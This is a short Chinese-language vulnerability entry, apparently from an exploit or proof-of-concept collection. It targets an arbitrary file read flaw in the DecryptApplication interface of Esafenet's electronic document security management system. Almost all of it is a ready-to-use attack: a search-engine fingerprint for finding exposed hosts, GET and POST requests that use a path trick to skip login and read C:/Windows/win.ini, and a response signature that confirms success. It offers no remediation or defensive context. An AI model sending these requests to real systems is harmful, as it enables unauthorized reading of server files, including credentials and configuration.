# 亿赛通-电子文档安全管理系统DecryptApplication接口存在任意文件读取漏洞

亿赛通-电子文档安全管理系统DecryptApplication接口 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="亿赛通-电子文档安全管理系统"`
- **请求**：`GET /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=1 HTTP/1.1`

**Payload**
```
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
command=ViewUploadFile&filePath=C:/Windows/win.ini&fileNamel=l.png&uploadFileId=1
```
- **响应特征**：200 support